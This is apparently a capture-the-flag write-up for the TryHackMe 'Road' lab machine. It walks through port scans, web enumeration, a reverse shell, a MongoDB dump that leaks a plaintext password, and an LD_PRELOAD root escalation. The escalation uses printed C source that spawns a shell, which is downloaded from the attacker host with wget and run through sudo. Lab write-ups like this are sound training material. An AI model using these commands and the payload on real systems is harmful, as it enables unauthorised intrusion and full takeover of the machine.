---
title: "THM - # Road"
classes: wide
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # Road"
categories:
  - THM
---

The given box ```Road``` is a Linux machine 

- [TryHackMe- Road](#tryhackme---Road)
  - [Recon](#recon)
	  - [Nmap Scan](#nmap-scan)
	  - [Autorecon Scan](#autorecon-scan)
 - [Enumeration](#enumeration)
	 - [Enumeration on port 80](#enumeration-on-port-80)

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/road.png" />
</center>

## Recon

### Nmap Scan

```shell
┌──(root㉿rE3oN)-[~/…/obsidian_vault/thm/LINUX/road]
└─# nmap -p- -v 10.10.160.58                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 12:24 IST
Initiating Ping Scan at 12:24
Scanning 10.10.160.58 [4 ports]
Completed Ping Scan at 12:24, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:24
Completed Parallel DNS resolution of 1 host. at 12:24, 0.02s elapsed
Initiating SYN Stealth Scan at 12:24
Scanning 10.10.160.58 [65535 ports]
Discovered open port 80/tcp on 10.10.160.58
Discovered open port 22/tcp on 10.10.160.58
SYN Stealth Scan Timing: About 15.93% done; ETC: 12:27 (0:02:44 remaining)
SYN Stealth Scan Timing: About 21.94% done; ETC: 12:29 (0:03:37 remaining)
```

### Autorecon Scan
```shell
# Nmap 7.92 scan initiated Sun Aug  7 12:26:13 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /root/enum-more/obsidian_vault/thm/LINUX/road/results/10.10.160.58/scans/_quick_tcp_nmap.txt -oX /root/enum-more/obsidian_vault/thm/LINUX/road/results/10.10.160.58/scans/xml/_quick_tcp_nmap.xml 10.10.160.58
adjust_timeouts2: packet supposedly had rtt of -76545 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -76545 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -77808 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -77808 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -75697 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -75697 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -76986 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -76986 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -76246 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -76246 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -76967 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -76967 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -1391631 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -1391631 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -1633878 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -1633878 microseconds.  Ignoring time.
Nmap scan report for 10.10.160.58
Host is up, received user-set (0.17s latency).
Scanned at 2022-08-07 12:26:13 IST for 33s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Sky Couriers
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
|_http-server-header: Apache/2.4.41 (Ubuntu)
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/7%OT=22%CT=1%CU=39650%PV=Y%DS=2%DC=T%G=Y%TM=62EF622E
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ
OS:(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11
OS:NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B
OS:3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M50
OS:5NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 28.506 days (since Sun Jul 10 00:18:50 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   174.50 ms 10.11.0.1
2   174.60 ms 10.10.160.58

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  7 12:26:46 2022 -- 1 IP address (1 host up) scanned in 33.63 seconds
```

## Enumeration

### Port 22

```shell
# Nmap 7.92 scan initiated Sun Aug  7 12:26:46 2022 as: nmap -vv --reason -Pn -T4 -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN /root/enum-more/obsidian_vault/thm/LINUX/road/results/10.10.160.58/scans/tcp22/tcp_22_ssh_nmap.txt -oX /root/enum-more/obsidian_vault/thm/LINUX/road/results/10.10.160.58/scans/tcp22/xml/tcp_22_ssh_nmap.xml 10.10.160.58
Nmap scan report for 10.10.160.58
Host is up, received user-set (0.17s latency).
Scanned at 2022-08-07 12:26:47 IST for 5s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh2-enum-algos: 
|   kex_algorithms: (9)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  7 12:26:52 2022 -- 1 IP address (1 host up) scanned in 5.72 seconds
```

### Port 80

#### feroxbuster
```shell
┌──(root㉿rE3oN)-[~/…/road/results/10.10.160.58/scans]
└─# cat ferox-directory.txt                       
200      GET      539l     1631w    19607c http://10.10.160.58/
200      GET       19l       93w     1505c http://10.10.160.58/assets/
200      GET       52l      149w     2619c http://10.10.160.58/v2/admin/login.html
```

```shell
┌──(root㉿rE3oN)-[~/…/road/results/10.10.160.58/scans]
└─# cat ferox-big.txt      
200      GET      539l     1631w    19607c http://10.10.160.58/
200      GET       19l       93w     1505c http://10.10.160.58/assets/
200      GET      459l      991w        0c http://10.10.160.58/phpMyAdmin/
200      GET      565l     6616w    41123c http://10.10.160.58/phpMyAdmin/ChangeLog
200      GET       52l      212w     1520c http://10.10.160.58/phpMyAdmin/README
200      GET      339l     2968w    18092c http://10.10.160.58/phpMyAdmin/LICENSE
200      GET       52l      149w     2619c http://10.10.160.58/v2/admin/login.html
200      GET       16l       60w      958c http://10.10.160.58/phpMyAdmin/doc/
200      GET       19l       90w     1624c http://10.10.160.58/phpMyAdmin/examples/
200      GET       98l      278w    22486c http://10.10.160.58/phpMyAdmin/favicon.ico
200      GET       19l       92w     1543c http://10.10.160.58/phpMyAdmin/js/
200      GET       29l      197w     3781c http://10.10.160.58/phpMyAdmin/libraries/
200      GET       58l      522w        0c http://10.10.160.58/phpMyAdmin/locale/
200      GET        2l        4w       26c http://10.10.160.58/phpMyAdmin/robots.txt
200      GET       19l       91w     1698c http://10.10.160.58/phpMyAdmin/sql/
200      GET       62l      563w        0c http://10.10.160.58/phpMyAdmin/templates/
200      GET       19l       93w     1556c http://10.10.160.58/phpMyAdmin/themes/
200      GET       16l       60w      958c http://10.10.160.58/phpMyAdmin/tmp/
200      GET       31l      225w     3925c http://10.10.160.58/phpMyAdmin/vendor/
```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web1.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web2.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web3.png" />
</center>

## Initial Foothold

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web4.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web5.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web6.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web7.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web8.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web9.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/web10.png" />
</center>

```shell
┌──(root㉿rE3oN)-[~/…/road/results/10.10.160.58/exploit]
└─# rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.11.77.75] from (UNKNOWN) [10.10.160.58] 46850
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 07:44:44 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
python3 -c 'import pty; pty.spawn("/bin/bash")'
ls
ls
bin    dev   lib    libx32	mnt   root  snap      sys  var
boot   etc   lib32  lost+found	opt   run   srv       tmp
cdrom  home  lib64  media	proc  sbin  swap.img  usr
www-data@sky:/$
cat ./home/webdeveloper/user.txt
cat ./home/webdeveloper/user.txt
63191e4ece37523c9fe6bb62a5e64d45
mongo 127.0.0.1
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/test?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("cc42216e-7f9d-470e-96a4-b60702d15469") }
MongoDB server version: 4.4.6
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
	https://community.mongodb.com
---
The server generated these startup warnings when booting: 
        2022-08-07T06:37:15.533+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2022-08-07T06:37:58.710+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
---
        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
show dbs
shshow dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
use admin
ususe admin
switched to db admin
show collections
shshow collections
system.version
use backup
ususe backup
switched to db backup
show collections
shshow collections
collection
user
db.collection.find()
dbdb.collection.find()
db.user.find()
dbdb.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
> 
```

## Privilege Escalation

Connect through ssh with the above credentials and try privesc methods..

```shell
┌──(root㉿rE3oN)-[~/…/road/results/10.10.160.58/exploit]
└─# ssh webdeveloper@10.10.160.58     
The authenticity of host '10.10.160.58 (10.10.160.58)' can't be established.
ED25519 key fingerprint is SHA256:yVQBxl1jOYRuf8zadoM2eJFmcAC2AQN8G/xKyzmPE5Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.160.58' (ED25519) to the list of known hosts.
webdeveloper@10.10.160.58's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 07 Aug 2022 07:52:53 AM UTC

  System load:  0.0               Processes:             125
  Usage of /:   60.1% of 9.78GB   Users logged in:       0
  Memory usage: 67%               IPv4 address for eth0: 10.10.160.58
  Swap usage:   0%


185 updates can be installed immediately.
100 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

[Reference](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

```c            
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

```shell
webdeveloper@sky:/tmp$ wget http://10.11.77.75:80/shell.c
--2022-08-07 08:08:19--  http://10.11.77.75/shell.c
Connecting to 10.11.77.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 144 [text/x-csrc]
Saving to: ‘shell.c’

shell.c                                      100%[=============================================================================================>]     144  --.-KB/s    in 0s      

2022-08-07 08:08:19 (14.0 MB/s) - ‘shell.c’ saved [144/144]

webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    6 | setgid(0);
      | ^~~~~~
shell.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 | setuid(0);
      | ^~~~~~
webdeveloper@sky:/tmp$ ls
mongodb-27017.sock                                                       systemd-private-0bc07a846eaf4c19925ae5fce02948e3-systemd-logind.service-ATiPsj
shell.c                                                                  systemd-private-0bc07a846eaf4c19925ae5fce02948e3-systemd-resolved.service-lWd3Xg
shell.so                                                                 systemd-private-0bc07a846eaf4c19925ae5fce02948e3-systemd-timesyncd.service-8p0xrf
systemd-private-0bc07a846eaf4c19925ae5fce02948e3-apache2.service-zkU2Bf
webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt	
3a62d897c40a815ecbe267df2f533ac6
# 
```

## Conclusion

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/LINUX/road/assets/images/flags.png" />
</center>